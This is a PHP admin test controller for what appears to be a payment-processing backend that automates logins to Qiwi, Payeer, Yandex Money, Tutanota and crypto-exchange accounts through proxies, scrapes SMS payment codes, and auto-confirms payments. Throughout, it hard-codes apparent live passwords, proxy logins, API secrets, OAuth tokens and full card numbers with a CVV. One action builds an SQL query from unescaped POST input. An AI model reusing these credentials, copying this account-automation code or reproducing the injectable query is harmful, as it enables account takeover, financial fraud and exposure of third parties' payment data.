<?php
class TestController extends Controller
{
	public function beforeAction($action)
	{
		if(!$this->isAdmin())
			$this->redirect(cfg('index_page'));

		return parent::beforeAction($action);
	}

	public function actionIndex()
	{
		echo <<<EOD
<html>
<body>
<form id="redirForm" method="post" action="https://money.yandex.ru/transfer">
				<input type="hidden" name="cardNumber" value="4890494707844221">
				<p>сейчас вы будете перенаправлены на оплату..., если нет то
					<input type="submit" value="перейти">
				</p>

			</form>


			<script>
				$(document).ready(function(){
					setTimeout(function(){
						$('#redirForm').submit().hide();
					}, 3000);
				});
			</script>
</body>
</html>

EOD;

	}


	/**
	 * для тестирования ApiManager
	 */
	public function actionApiManager()
	{
		//если в запросе не передано то берем отсюда
		$apiKey = 'keyTst213123';

		$cfg = cfg('managerApi');

		$params = $_POST['params'];

		$url = 'https://'.$cfg['host'].'/'.(($params['debug']) ? 'test.php' : 'index.php').'?r=apiManager';

		if($_POST['submit'])
		{
			$postData = json_decode($params['postData'], true);
			$_SESSION['apiManagercache'] = $params;

			//добавить ключ если нет
			if(!$postData['key'])
				$postData['key'] = $apiKey;

			$user = User::model()->findByAttributes(['api_key' => $postData['key']]);
			$apiSecret = $user->api_secret;

			//добавить хеш к запросу, ести нет
			if(!$postData['hash'] and $apiSecret)
			{
				if($postData['requestId'])
					$postData['hash'] = ApiManagerController::hash($postData['requestId'].$postData['key'].$apiSecret);
				else
				{
					$hashParams = $postData;

					foreach ($hashParams as $key=>$val)
					{
						if(is_array($val))
							unset($hashParams[$key]);
					}

					$postData['hash'] = ApiManagerController::hash(implode('', $hashParams).$apiSecret);

					if($params['debug'])
						echo "\n hash: ".$postData['hash']."\n";
				}
			}


			$postDataEncoded = json_encode($postData);

			if($params['debug'])
				echo $postDataEncoded."\n";

			$sender = new Sender;
			$sender->followLocation = false;
			$sender->timeout = 180;

			$content = $sender->send($url, $postDataEncoded);

			if($json = @json_decode($content, true) and $params['debug'])
				print_r($json);
			else
				echo($content);

			die;
		}

		if(!$params)
			$params = $_SESSION['apiManagercache'];


		$this->render('apiManager', array(
			'params'=>$params,
		));
	}

	public function actionReplace()
	{
		$str = 'Вывод BTC на адрес 38EvXfU2zM8PJmUFr1wTQZPQxgmffqw5pjОтменить | Прислать письмо еще раз ';
		prrd(str_replace('Отменить', '<a href="">sdfa</a>', $str));
	}

	public function actionTestMail()
	{
		$params['email'] = 'ClaytonMirray@tutanota.com';
		$params['emailPass'] = 'Gwtc4b!mG(sha^f34';
		$params['proxyIp'] = '193.233.149.194';
		$params['proxyPort'] = '47431';
		$params['proxyLogin'] = 'D0DF4zj8Rw';
		$params['proxyPass'] = 'WolfgangSchneider';


		$url = 'http://94.140.125.237/selenium/index.php?key=testtest&method=ConfirmPaymentTutanota'.
			'&email='.$params['email'].
			'&emailPass='.urlencode($params['emailPass']).'&proxyIp='.$params['proxyIp'].
			'&proxyPort='.$params['proxyPort'].'&proxyLogin='.$params['proxyLogin'].'&proxyPass='.$params['proxyPass'];

		$sender = new Sender;

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Accept: */*',
			'Accept-Encoding: gzip, deflate, br',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Content-Type: application/json; charset=UTF-8',
		];

		$content = $sender->send($url);
		prrd(json_decode($content));
	}

	public function actionTestContent()
	{
		$login = 'misterxxx@tutanota.com';
		$pass = 'XacxKcPb2sTd';
		$proxy = 'UUqCKLShJd:mainer@83.217.11.126:49872';
		$browser = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36';

//		$login = 'dronkom@tutanota.com';
//		$pass = '53QXwF7r38cE';
//		$proxy = 'UUqCKLShJd:mainer@195.88.209.187:49872';
//		$browser = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36';

		$bot = new WexCurlBot($login, $pass, $proxy, $browser);
		prrd($bot->wexHistory());


	}

	public function actionPayeer()
	{
		$bot = new PayeerBot('P1002760755', 'u7QmJ4Xy',
			'adm:FHldfjksfojf332@54.37.196.83:7778',
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36'
		//,['withoutAuth'=>true]
		);

		prrd($bot->getPayParams(100.00));
	}

	public function actionSms()
	{
		prrd(QiwiPay::getPayUrl());

		//prrd(strtotime('26.08.18 15:57'));
		$api = new SmsRegApi('kgaLktMNgt:seven787@31.184.233.251:52637');

		$smsHistory = $api->getSmsHistory('79263579269');

		if(!$smsHistory)
		{
			toLogError('Ошибка получения истории смс login = '.$this->login);
			return false;
		}

		foreach($smsHistory as $item)
		{
			print_r($item);

			$matchStr =  '!(scheta|invoice) 78637148 (na|on) (summu|amount) ([\d.]+) RUB (vash sms-kod:|your SMS-code:) (\d+)!iu';
			if(preg_match($matchStr, $item['text'], $matches))
			{
				$amount = $matches[4];
				$smsCode = $matches[6];
				break;
			}
		}

		prrd('$smsCode '.$smsCode);


		//$result = $api->getNewNumber();
		//$tzid = '43174503';
		//$result = $api->setReady($tzid);
		//$result = $api->getSms($tzid);
		//$result = $api->setComplete($tzid);

		//$result = $api->getSmsHistory('+77475228628');

		$result = $api->getPersonalNumber('ru');

		prrd($result);
		//print_r($api);
	}

	public function actionLiveCoin()
	{
		$login = '';
		$pass = '';
		$proxy = '';
		$browser = '';

		$bot = new LivecoinBot($login, $pass, $proxy, $browser);

		if($bot->error)
			echo "\n error: ".$bot->error;

		if(!$bot->error)
		{
			prrd($bot->getbalance());
		}

		prrd($bot);

	}

	public function actionJs()
	{
		echo exec('phantomjs '.__DIR__.'/test/test.js');
	}

	public function actionNewYandexPay()
	{
		var_dump(NewYandexPay::getPayUrlTest(437, 100, false));
	}

	public function actionNotify()
	{
		var_dump(NewYandexPay::startApiNotification());
	}

	public function actionExchange()
	{
		$cfg = cfg('newYandexPayYm');
		$amountRub = 30;
		$amountBtc = 0.00024;
		$wallet = '410017394097107';
		$orderId = '111';
		$successUrl = 'https://www.google.com/search?q=success';
		$failUrl = 'https://www.google.com/search?q=fail';
		$key = 'HM6Ly9tb25leS55YW5kZXgucnUvdHJhbnNmZXI/cmVjZWl2ZXI9NDEwMDE3NDE2Njk4NzA4JnN1b';

		$urlYandex = str_replace(
			['{wallet}','{amount}','{orderId}','{successUrl}'],
			[$wallet, $amountRub, $orderId, ''],
			$cfg['yandexUrl']
		);


		$proxy = $cfg['proxy'];

		$sender = new Sender;
		$sender->followLocation = false;
		$sender->proxyType = 'socks5';


		$postData = "yandex_link=".base64_encode($urlYandex)."&success_link=".base64_encode($successUrl)."&fail_link="
			.base64_encode($failUrl)."&yad=".$amountRub."&bit=".$amountBtc;

		$hash = md5($postData.$key);
		$url = 'https://btc-exchange.biz/api.php?key='.$hash;

		//echo($url."\n);prrd($postData);
		$content = $sender->send($url, $postData, $proxy);

		$arr = json_decode($content, true);

		if($arr['status'] == 'success')
		{
			echo $arr['link'];
		}
		else
			echo $arr['error'];
	}

	public function actionQiwi()
	{
//		prrd(md5('KRFKHOVDNPNYYHBK'));
		prrd(NextQiwiPay::startCheckOrders());

		$bot = new QiwiBot('+79167696946', 'zrmNSzjNSJ8597', 'DK7UAYOUai:seven787@83.217.8.132:44369', 'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.4) Gecko/20070622 Firefox/2.0.0.4');

		//prrd($bot->getBalance());
		prrd($bot->getLastPayments(1));

		prrd(round(microtime(true) * 1000));
		prrd(NextQiwiPay::getPayParams(16, 15));
	}

	public function actionTestYad()
	{
		//'btcRateBitfinex'=>config('btc_usd_rate_btce'),
		prrd(NewYandexPay::getWaitPayments(0, 6));
		NewYandexPay::getPayUrlExchange('16', 1500, false, 13134);
	}

	public function actionHash($requestId)
	{
		$apiKey = 'RYTVTWVJVUPRCZOO';
		$apiSecret = 'qB6VH94JVd8JKYXHxDH45FzSPh2JkpxW';

		prrd(md5($requestId.$apiKey.$apiSecret));
	}

	public function actionImg()
	{
		$model = ImagePosition::model()->findByAttributes(['id'=>1]);

		$model->sms_input_pos = '';
		$model->button_pos = '';
		$model->status = 'success';

		$model->save();
		$model = ImagePosition::model()->findByAttributes(['id'=>1]);
		prrd($model);

	}

	public function actionOrder()
	{
		$model = NewYandexPay::model()->findByAttributes(['order_id'=>'15415025960110']);

		prrd($model);
	}

	public function actionAccountCardInfo()
	{
		$models = [];

		$params = $_POST['params'];
		$searchStr = $_POST['searchStr'];

		if($_POST['search'])
		{
			$searchStr = trim(strip_tags($_POST['searchStr']));

			$condition = "`order_id`LIKE '%" . $searchStr . "'";

			if($model = NewYandexPay::model()->find($condition))
			{
				$this->render('accountCardInfo', [
					'model'=>$model,
					'params'=>$params,
					'searchStr'=>$searchStr,
				]);
			}
			else
				$this->error('Запись не найдена');
		}
		elseif($_POST['save'])
		{
			$result = NewYandexPay::addCardInfo($params);
			if($result)
				$this->success('Сохранено');
			else
				$this->error('Ошибка сохранения');
		}

		return $this->render('accountCardInfo',[
			'model'=>$model,
			'params'=>$params,
			'searchStr'=>$searchStr,
		]);
	}

	public function actionStr()
	{
		$failMessage = '96956 transaction; card_no: 4890494396549388; 10/20; cvv: 901. WRONG PASSWORD. ERROR.';

		$failMessage = 	str_replace('4890494396549388', '...'.substr('4890494396549388', 12, 15), $failMessage);
		$failMessage = str_replace('901', '...', $failMessage);
		prrd($failMessage);
	}


	public function actionMegakassaForm()
	{
		$cfg = cfg('newYandexPayMegakassa');

		$shop_id		= $cfg['shopId'];
		$amount			= number_format(25, 2, '.', ''); // -> "100.50"
		$currency		= 'RUB'; // или "USD", "EUR"
		$description	= 'dsfsdf';
		$order_id		= '22222222';
		$method_id		= '22';
		$client_email	= 'sdfsdf@tuta.com';
		$client_phone	= '+79957002742';
		$debug			= ''; // или "1"
		$secret_key		= 'b583c4820d8c37bc'; // из настроек сайта в личном кабинете
		$signature		= md5($secret_key.md5(join(':', array($shop_id, $amount, $currency, $description, $order_id, $method_id, $client_email, $debug, $secret_key))));
		$language		= 'ru'; // или 'en'
		$signature		= md5($secret_key.md5(join(':', array($shop_id, $amount, $currency, $description, $order_id, $method_id, $client_email, $debug, $secret_key))));

		echo <<<EOD
<form method="post" action="https://megakassa.ru/merchant/" accept-charset="UTF-8" target="_blank">
	<input type="hidden" name="shop_id" value="$shop_id" />
	<input type="hidden" name="amount" value="$amount" />
	<input type="hidden" name="currency" value="$currency" />
	<input type="hidden" name="description" value="$description" />
	<input type="hidden" name="order_id" value="$order_id" />
	<input type="hidden" name="method_id" value="$method_id" />
	<input type="hidden" name="client_email" value="$client_email" />
	<input type="hidden" name="client_phone" value="$client_phone" />
	<input type="hidden" name="debug" value="$debug" />
	<input type="hidden" name="signature" value="$signature" />
	<input type="hidden" name="language" value="$language" />
	<input type="submit" value="Купить" />
</form>
EOD;
	}

	public function actionMegakassaUrl()
	{
		echo NewYandexPay::generateMegakassaUrl('100', '1111111');
	}

	public function actionYandex($step = '', $code = '')
	{
		$cfg = [
			//'accessToken' => 'B2B4960B8D22173C4DDAD45A7DDD658FDEE5D4931232B2E669CAE0FF50BB9089B6BE12A588707E9117359E28F5C4AD081716B7C414822749B7A993E5A43F1ED57441C024E03F96379FC14F03644C3D0C1A3F793863FF02D0E19FCFF54B0FFD940A8AE339C7499433D3317F599AB0DC9CC5DFF9FF67',
			//'proxy' => 'panel:nlpPZ6yqJxEHtcOydv@31.184.252.69:443',
			//test
			'appIdentifier' => '5235388521A65E3A2A76418A03141F00EC06F01336B2B788C3E715CA38534D4A',
			'appSecret' 	=> '4C0F15FA7E6A515EC20D1C9F0040522462982B6BAA9AEE68EB6EE89B9DAD8CFA70532512F80C19F63588073935262798405B3AD64C6FE9940BE27F217314E48C',
			'proxy' 		=> 'uepckLtY4c:TanyaMataras75@91.107.119.79:62690',
			'authRedirectUrl'	=>	'https://youprocessing.cc/index.php?r=test/yandex&step=code',
			'authRedirectSuccess'	=>	'https://youprocessing.cc/index.php?r=test/yandex&step=success',
			'accessToken'	=> '410015949540286.7FE60E02B8F3EB7F84775EF5C20A3FD66C5F7449F2132228ABD3C46F3B9CC7719ECD02D8D4745A77AD0BE43D9DA4DBDD625872F2A7978CBC82268D7CC7155C17C7EC67507CF62634E4B1E44F36D759C05B6C39F36823069D62F1D19530F9C84747C45D1FFC79C1E0E3DAEE08B8D0BE21D08140B3F808BB1A03D443659489E74A',
		];

		if($cfg['accessToken'])
		{
			//если приложение авторизовано на кошельке
			$api = new YandexApi();
			$api->accessToken = $cfg['accessToken'];

			var_dump($api->getBalance());
			print_r($api->getHistory(strtotime('01.06.2018'), time()));

		}
		else
		{
			//если нет авторизации
			$api = new YandexApi();
			$api->appIdentifier = $cfg['appIdentifier'];
			$api->appSecret = $cfg['appSecret'];
			$api->proxy = $cfg['proxy'];

			$api->authRedirectUrl = $cfg['authRedirectUrl'];
			$api->authRedirectSuccess = $cfg['authRedirectSuccess'];

			if($step == 'code')
			{
				$api->auth($code);
			}
			elseif($step == 'success')
			{
				var_dump($_REQUEST);
			}
			else
			{
				echo $api->authForm();
			}
		}
	}

	public function actionYandexAuth()
	{
		toLog('YandexTest: '.Tools::arr2str($_REQUEST));
		echo 'ff';
	}

	public function actionYandexRepair()
	{
		$file = __DIR__.'/test/yandex.txt';

		$content = file_get_contents($file);

		if(!preg_match_all('!(\d+)!', $content, $res))
			die('error1');

		$repairCount = 0;

		foreach($res[1] as $orderId)
		{
			$models = NewYandexPay::model()->findAll("`order_id`='$orderId'");

			if(!$models)
				die('error2');

			if(count($models) > 1)
			{
				echo "\n перепроверить заявку $orderId";
				continue;
			}

			$model = current($models);

			/**
			 * @var NewYandexPay $model
			 */


			if($model->status == NewYandexPay::STATUS_SUCCESS)
			{
				echo "\n успешно";
				continue;
			}
			elseif($model->status == NewYandexPay::STATUS_WAIT)
			{
				$model->status = NewYandexPay::STATUS_SUCCESS;
				$model->date_pay = $model->date_add;

				if($model->save())
				{
					echo "\n подтвержден $orderId на {$model->amount}";
					$repairCount++;
				}
				else
					die('error 3');
			}
			else
				die('error4');


		}

		echo "\n подтверждено $repairCount заявок";
	}

	public function actionYandexModule()
	{
		echo Yii::app()->getModule('yandexAccount')->getMenuManager();
	}

	public function actionLimit()
	{
		prrd(config('account_in_limit_full'));
	}


	public function actionInv()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		$baseUrl = 'https://api.adgroup.finance';
		$method = '/user/list';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"Authorization:'.$finalString.'",
			'Content-Type: application/json',
		];
		$postData = '{
		"header":{
				"version":"0.1",
				"txName":"listUsers",
				"lang":"EN"
		  }
		}';

		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		print_r($sender->info);
		die;

	}

	public function actionUserList()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		$baseUrl = 'https://api.adgroup.finance';
		$method = '/user/list';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"Authorization:'.$finalString.'",
			'Content-Type: application/json',
		];
		$postData = '{
		"header":{
				"version":"0.1",
				"txName":"listUsers",
				"lang":"EN"
		  }
		}';

		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		print_r($sender->info);
		die;

	}

	public function actionWalletList()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		$baseUrl = 'https://api.adgroup.finance';
		$method = '/merchant/get-wallet-list';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"Authorization:'.$finalString.'",
			'Content-Type: application/json',
		];
		$postData = '{
		"header":{
				"version":"0.1",
				"txName":"fetchWallets",
				"lang":"EN"
		  }
		}';

		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		print_r($sender->info);
		die;

	}

	public function actionRegisterOrder()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		$baseUrl = 'https://api.adgroup.finance';
		$method = '/transfer/tx-merchant-wallet';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"Authorization:'.$finalString.'",
			'Content-Type: application/json',
		];
		$postData = '{
		"header":{
				"version":"0.1",
				"txName":"p2pInvoiceRequest",
				"lang":"EN"
		  },
		  "reqData":{
		 		"tel":"79968032004",
				"user_id":"6d172289-8b90-436a-83c1-1b85f5211e3d",
				"amount":"2",
				"destCurrencyCode":"RUB"

		  }
		}';

		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		print_r($sender->info);
		die;

	}

	/*
	 public function actionInv()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		$baseUrl = 'https://api.adgroup.finance';
		$method = '/transfer/tx-qiwi-invoice';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"Authorization:'.$finalString.'",
			'Content-Type: application/json',
		];
		$postData = '{
		"header":{
				"version":"0.1",
				"txName":"Invoice",
				"lang":"EN"
		  },
		  "reqData":{
		 		"tel":"79968032004",
				"user_id":"6d172289-8b90-436a-83c1-1b85f5211e3d",
				"amount":"2",
				"destination_currency":"RUB"

		  }
		}';

		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		print_r($sender->info);
		die;

	}
	*/

	public function actionRegister()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		//prrd($finalString);

		$baseUrl = 'https://api.adgroup.finance';
		//$baseUrl = 'http://18.185.170.86';
		$method = '/user/signup';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"Authorization:'.$finalString.'",
			'Accept: */*',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/json; charset=UTF-8',
		];
		$postData = '{
		"header":{
				"version":"0.1",
				"txName":"signup",
				"lang":"EN"
		  },
		  "reqData":{
					"login":"man1",
					"name":"man1",
					"email":"raintramp@tutanota.com"
		  }
		}';

		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		//print_r($sender->info);
		die;

	}


	public function actionList()
	{
		$clienId = 'CaD7kXtYOK7hkzhY';
		$clienSecret = 'IC1NI86LSRnqezmfU839OJkH7gCLLM';
		$finalString = 'Basic '.base64_encode($clienId.':'.$clienSecret);

		//prrd($finalString);

		$baseUrl = 'https://api.adgroup.finance';
		//$baseUrl = 'http://18.185.170.86';
		$method = '/user/list';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->additionalHeaders = [
			"version:0.1",
			"lang:EN",
			"Authorization:'.$finalString.'",
			'Accept: */*',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/json; charset=UTF-8',
		];
		$postData = '';
		$proxy = 'adxXByOhrk:annglosses@83.217.11.169:46810';

		$content = $sender->send($baseUrl.$method, $postData, $proxy);
		print_r($content);
		print_r($sender->info);
		die;

	}


	public function actionConfirm()
	{
		$url = 'https://94.140.125.237/univerTestSsh/test.php?r=api/NewConfirmYadPaymentWithApi';

		$sender = new Sender;
		$sender->followLocation = false;

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Accept: */*',
			'Accept-Encoding: gzip, deflate, br',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Connection: keep-alive',
			'Content-Type: application/x-www-form-urlencoded',
		];

		$postData = 'key=api_key128312683&request='.urlencode('{"key":"testtest","method":"ConfirmPayment","withdraw_amount":"10","amount":"10","label":"i_5bff9d5ee0e927.38410713","operation_id":"596797614616010012","datetime":"2018-11-29T09:06:54Z","wallet":"410017580154470","sender":"","notification_type":"card-incoming","codepro":"false","unaccepted":"false","currency":"643"}');

		$content = $sender->send($url, $postData);
		print_r( $sender->info);
		print_r($content);
		die;
	}

	public function actionPiastrix()
	{
		$cfg = [
			'shopId' => '1382',
			'secret' => 'rrjomySZERFXfv2xdX8hgb1PI',
			'payWay' => 'card_rub',
		];

		$amount = '30.1';
		$currency = '643';
		$description = 'тест';
		$orderId = '111';

		$params = [
			'shop_id' => $cfg['shopId'],
			'amount' => '30.1',
			'currency' => '643',
			'description' => 'тест описание1',
			'shop_order_id' => '111',
		];

		ksort($params);

		$sign = '';

		foreach($params as $val)
			$sign .= $val.':';

		$sign .= $cfg['secret'];

		$params['sign'] = hash('sha256', $sign);
		$params['payway'] = $cfg['payWay'];

//		$url = 'https://pay.piastrix.com/ru/pay';
//
//		$sender = new Sender;
//		$sender->followLocation = false;
//		$sender->useCookie = false;
//		$content = $sender->send($url, http_build_query($params));

		$fields = '';

		foreach($params as $key=>$val)
			$fields .= '<input type="hidden" name="'.$key.'" value="'.$val.'"/>';

		echo <<<EOD
		<form method="post" action="https://pay.piastrix.com/ru/pay" target="_blank">
			$fields
			<input type="submit" name="" value="Submit"/>
		</form>
EOD;

		//print_r($sender->info);
		//die($content);

	}



	//тестим скорость мегакассы
	public function actionMegakassaSpeed()
	{
		$threadCount = 1;		//по $threadCount запросов за раз
		$requestAmount = 50;	//всего запросов
		$pause = 0;

		session_write_close();

		$sender = new Sender;
		$sender->useCookie = false;

		$url = 'https://188.138.57.110/test.php?r=testClone/megakassaThread';

		$requestArr = [];
		$requestChunk = [];

		for($i = 0; $i < $requestAmount; $i++)
		{
			if(count($requestChunk) == $threadCount)
			{
				$requestArr[] = $requestChunk;
				$requestChunk = [];
			}

			$requestChunk[] = $url;
		}

		if($requestChunk)
			$requestArr[] = $requestChunk;

		$num = 1;

		foreach($requestArr as $chunk)
		{
			$contents = $sender->send($chunk);

			foreach($contents as $content)
			{
				if(preg_match('!MegakassaUrl error1!', $content))
				{
					echo "<br>прервано";
					break 2;
				}
				else
					echo "<b>$num.</b> ".$content."<br>";

				$num++;
			}

			echo "<br><hr><br>";

			if($pause > 0)
				sleep($pause);
		}

		echo "<br><br>Времени затрачено: ".Tools::timeSpend();

	}

	public function actionMegakassaClear()
	{
		MegakassaProxyRequest::startClear();
	}

	/**
	 * для тестирования MegaQiwi
	 */
	public function actionMegaQiwi()
	{
		$params = $_POST['params'];

		$url = 'https://apiapi.pw/tes.php?r=testApi';

		if($_POST['submit'])
		{
			$_SESSION['megaQiwiPostStr'] = $params['postData'];

			if($params['debug'])
				echo $params['postData']."\n";

			$sender = new Sender;
			$sender->followLocation = false;
			$content = $sender->send($url, $params['postData']);

			if($json = @json_decode($content, true) and $params['debug'])
				print_r($json);
			else
				echo($content);

			die;
		}

		$this->render('megaQiwi', array(
			'params'=>$params,
			'postData' => ($params['postData']) ? $params['postData'] : $_SESSION['megaQiwiPostStr'],
		));
	}

	public function actionMegaQiwiUrl()
	{
		var_dump(TestQiwi::generateMegakassaUrl(
			25,
			'2222',
			'+79957002742',
			'https://google.com',
			'https://yandex.com')
		);
	}

	public function actionProject()
	{
//		prrd(time(DateTime::createFromFormat('d.m.y H:i:s','06.12.18 21:52:33')).' ');
		//prrd(date('d.m.y H:i:s',1544133284));
		prrd(Project14Transaction::saveAllTransactions('410016252495163'));
	}

	public function actionClean()
	{
		ManagerApiRequest::clean();
	}

	public function actionRedirect()
	{
		$this->redirect('account/list', ['login'=>'123', '#'=>title]);
	}


	public function actionYandexHistoryFromNikolas()
	{
		session_write_close();
		$url = 'http://85.25.109.85:661/v1/site/deposit-history?token=fhOIEHfpIEuh87fgoe98fto3i3fagoGF39rfeihMw';

		$sender = new Sender;
		$sender->followLocation = true;

		$content = $sender->send($url);

		$response = json_decode($content, true);

		if($response)
		{
			$successCount = 0;

			try
			{
				if(is_array($response) and $response['items'])
				{
					foreach($response['items'] as $data)
					{
						$paramsArr = [
							'amount' => $data['withdraw_amount'],
							'number' => ($data['notification_type'] == 'card-incoming') ? 'card' : $data['sender'],
							'paymentId' => $data['operation_id'],
							'orderId' => $data['label'],
						];

						if(NewYandexPay::confirmPayment($paramsArr))
							$successCount++;
						else
							continue;

					}
					prrd($successCount);
				}
				else
					return false;
			}
			catch(Exception $e)
			{
				echo 'Error';
				return false;
			}
		}
		else
			return false;
	}

	public function actionSimVer()
	{
		$txt = '
21492770	1197	182
21658915	2013	182
21677603	1187	161
21692243	1180	193
21692767	1168	578
21692856	1165	642
21692891	1169	1367
21692896	1177	193
21692901	1167	1044
21692997	1173	1177
21693015	1171	642
21693017	1174	803
21693039	1178	1338
21693160	1190	193
21693290	1194	1177
21693296	1195	182
21693334	1198	437
21693371	1199	1367
21693428	1206	174
21693443	1213	1528
21693463	1211	161
21693484	1212	1052
21693500	1216	193
21693529	1217	386
21695843	1516	193
21695923	1524	193
21696456	1505	161
21696674	1520	437
21696692	1517	436
21696746	1521	161
21696756	1515	1605
21696801	1519	436
21696810	1527	174
21696834	1518	588
21696838	1522	439
21696853	1526	193
21702273	2007	193
21702458	2001	174
21702523	2015	193
21702592	2010	427
21702779	2025	161
21703399	2121	1012
21703635	2123	439
21703660	2118	546
21703678	2116	427
21703730	2125	1423
21704783	2255	182
21706058	2427	953
21706287	2483	427
21706474	2489	427
21706515	2487	723
21706521	2485	439
21706531	2481	1124
21707046	2705	414
21708144	2697	1124
21708586	2693	414
21710051	2818	161
21710112	2819	1522
21710133	2816	439
21710973	2986	193
21711577	2988	427
21711683	2987	594
21711686	2989	1423
21712304	3069	482
21713191	3149	193
21713618	3187	439
21713641	3185	182
21714035	3221	1044
21714042	3222	1044
21714049	3220	642
21715106	3326	1338
21715827	3409	161
		';

		preg_match_all('!(\d+)\s+(\d+)\s+(\d+)!', $txt, $res);
		$successCount = 0;
		foreach ($res[1] as $key=>$orderId)
		{
			$transId = $res[2][$key];
			$amount = $res[3][$key];

			if($model = SimTransaction::getModel(['id'=>$transId]))
			{
				echo "{$model->id} : {$model->status}\n";

				if($model->status === SimTransaction::STATUS_SUCCESS)
					$successCount++;
			}
		}

		echo "\n success count: $successCount";
	}

	public function actionTestApi()
	{
		$apiKey = 'VGTFJGMEGRGUWRVS';
		$apiSecret = 'CMoriDigOMyOjGu85ev4HH5HrgZ83x6q';
		$amount = '50';
		$method = 'getYandexPayUrl';

		prrd(md5($apiKey.$method.$amount.$apiSecret));
	}

	public function actionStat()
	{
		$exchangeYadBitPayments = ExchangeYadBit::getModels('1550018078', '1550178000', 0, 2);
		$exchangeYadBitStats = ExchangeYadBit::getStats($exchangeYadBitPayments);

		prrd(arr2str($exchangeYadBitStats));
	}

	public function actionStartOfMonth()
	{
		$values = [
			0,
			strtotime('01.02.2018 15:10'),
			strtotime('02.02.2018'),
			strtotime('14.01.2018'),
			time(),
		];

		foreach($values as $timestamp)
		{
			echo date('d.m.Y H:i:s', Tools::startOfMonth($timestamp))."\n";
		}
	}

	public function actionCoinpayments()
	{
		$cfg = [
			'apiUrl'=>'https://www.coinpayments.net/api.php',
			'apiVersion'=>'1',
			'apiKey' => 'ca26667ba481b4ad5572d10a8bc8c02fdc0f9b0d102139b7700f2bd87d7e6e08',
			'apiSecret' => '47B4426855be281f03623b2F3CfbBc371CE8b0cD688B59768f684f2A18b4AAa4',
		];

		$sender = new Sender;
		$sender->useCookie = false;

		$mainFields = 'format=json&version='.$cfg['apiVersion'].'&key='.$cfg['apiKey'];

		$postData = $mainFields.'&cmd=balances&all=1';
		$sender->additionalHeaders['HMAC'] = 'HMAC:'.hash_hmac('sha512', $postData, $cfg['apiSecret']);

		$content = $sender->send($cfg['apiUrl'], $postData);

		var_dump($content);
		print_r($sender->info);
	}

	public function actionTestHist()
	{
		session_write_close();
		$url = 'http://85.25.109.85:661/v1/site/deposit-history?token=fhOIEHfpIEuh87fgoe98fto3i3fagoGF39rfeihMw&count=1500&offset=2000';

		$sender = new Sender;
		$sender->followLocation = true;

		$content = $sender->send($url);

		$response = json_decode($content, true);

		prrd($response);

		if($response)
		{
			$successCount = 0;

			try
			{
				if(is_array($response) and $response['items'])
				{
					foreach($response['items'] as $data)
					{
						$paramsArr = [
							'amount' => $data['withdraw_amount'],
							'number' => ($data['notification_type'] == 'card-incoming') ? 'card' : $data['sender'],
							'paymentId' => $data['operation_id'],
							'orderId' => $data['label'],
						];

						if(NewYandexPay::confirmPayment($paramsArr))
							$successCount++;
						else
							continue;
					}
					echo($successCount);
					die;
				}
				else
					return false;
			}
			catch(Exception $e)
			{
				echo 'Error';
				return false;
			}
		}
		else
			return false;
		die;
	}

	public function actionAjax()
	{
		return $this->render('ajax');
	}


	public function actionLoadUsers()
	{
		$data = User::model()->findAll('client_id=:client_id and role=:role', [
			':client_id' => (int)$_POST['client_id'],
			':role' => User::ROLE_MANAGER,
